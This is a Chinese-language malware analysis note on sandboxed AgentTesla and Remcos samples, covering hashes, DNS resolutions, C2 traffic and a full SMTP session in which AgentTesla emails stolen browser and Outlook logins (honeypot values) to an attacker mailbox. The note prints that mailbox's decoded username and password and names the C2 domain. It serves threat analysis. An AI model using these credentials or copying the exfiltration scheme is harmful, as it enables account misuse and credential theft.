## AgentTesla

[8101b25934800925fbfab644e9df0953471f5895dd535aa7dc4d717cae9a733e (MD5: 27BEA6CCC5FA39E2714D72360700BDD7) - Interactive analysis - ANY.RUN](https://app.any.run/tasks/80c1bc46-ec7e-4091-a53e-8c53b212b31e)

### DNS Resolutions

Domain | IP
-|-
smtp.evarsana.com|208.91.198.143<br>208.91.199.224<br>208.91.199.225<br>208.91.199.223

### Connections

- 通过 **587** 端口、基于 SMTP 协议发送邮件，未结合 TLS 协议
- 通信全过程
    ```bash
    S: 220 us2.outbound.mailhostbox.com ESMTP Postfix
    C: EHLO User-PC
    # EHLO：发送端主机名

    S:
    250-us2.outbound.mailhostbox.com
    250-PIPELINING
    250-SIZE 41648128
    250-VRFY
    250-ETRN
    250-STARTTLS    # 支持 TLS 连接请求
    250-AUTH PLAIN LOGIN
    250-AUTH=PLAIN LOGIN
    250-ENHANCEDSTATUSCODES
    250-8BITMIME
    250 DSN

    # Base64 编码
    C: AUTH login dGltb3RoeS5oZWFsZXlAZXZhcnNhbmEuY29t
    # Username: timothy.healey@evarsana.com
    S: 334 UGFzc3dvcmQ6
    # Password:
    C: Q29tbWFuZG8xMjM=
    # Commando123
    S: 235 2.7.0 Authentication successful
    C: MAIL FROM:<timothy.healey@evarsana.com>
    S: 250 2.1.0 Ok
    C: RCPT TO:<timothy.healey@evarsana.com>
    S: 250 2.1.5 Ok
    C: DATA
    S: 354 End data with <CR><LF>.<CR><LF>

    C:
    MIME-Version: 1.0
    From: timothy.healey@evarsana.com
    To: timothy.healey@evarsana.com
    Date: 12 Aug 2020 16:28:16 +0100
    Subject: PW_admin/USER-PC
    Content-Type: text/html; charset=us-ascii
    Content-Transfer-Encoding: quoted-printable

    # 被入侵主机的一些信息
    Time: 08/12/2020 16:28:13<br>User Name: admin<br>Computer Name: U=
    SER-PC<br>OSFullName: Microsoft Windows 7 Professional <br>CPU: I=
    ntel(R) Core(TM) i5-6400 CPU @ 2.70GHz<br>RAM: 3583.61 MB<br><hr>=
    URL:https://m.facebook.com/<br>=0D=0AUsername:honey@pot.com<br>=0D=0A=
    Password:honeypass356<br>=0D=0AApplication:Chrome<br>=0D=0A<hr>=0D=0A=
    URL:https://m.facebook.com<br>=0D=0AUsername:honey@pot.com<br>=0D=0A=
    Password:honeypass356<br>=0D=0AApplication:Firefox<br>=0D=0A<hr>=0D=0A=
    URL:192.168.1.1<br>=0D=0AUsername:honey@pot.com<br>=0D=0APassword=
    :honeypass356<br>=0D=0AApplication:Outlook<br>=0D=0A<hr>=0D=0A

    .

    S: 250 2.0.0 Ok: queued as B2F1E1C214D
    C: QUIT
    S: 221 2.0.0 Bye
    ```

## Remcos

[923483a20bfa8c7734ff5cd5f1d2ebb4a029efe6af2365cd4730a0955e038ccd (MD5: C1F0543F80F46A867D38CF9CD0D95A4E) - Interactive analysis - ANY.RUN](https://app.any.run/tasks/940ce80a-e6d7-4e16-b142-32beb6ab0d96#)

### DNS Resolutions

Domain | IP
-|-
www.kesaihk.com|185.19.85.183

### Connections

主要是与 CnC 服务器的通信，向 CnC 服务器发送被感染主机的一些基本信息以及被感染后主机上的具体操作序列，记录详细程度高<br>
![发送信息的基本解析](img/send-info.jpg)

### Others

`logs.dat`日志文件是 Remcos 的特征之一<br>
![日志文件内容](img/logs-dat.jpg)

## 总结

- 通过邮件方式发送信息比较复杂，不利于实时沟通，因此发送多的是用户名密码之类比较重要、更新周期长的数据
- 而直接与 CnC 服务器通信，简单快捷，可以实时沟通、交换新采集的数据，但会暴露服务器的位置

## 参考资料

- [Agent Tesla - Malware Trends Tracker by ANY.RUN](https://any.run/malware-trends/agenttesla)
- [Which SMTP Port Should I Use? Understanding Ports 25, 465, & 587](https://www.mailgun.com/blog/which-smtp-port-understanding-ports-25-465-587/)
- [Remcos RAT - Malware Trends Tracker by ANY.RUN](https://any.run/malware-trends/remcos)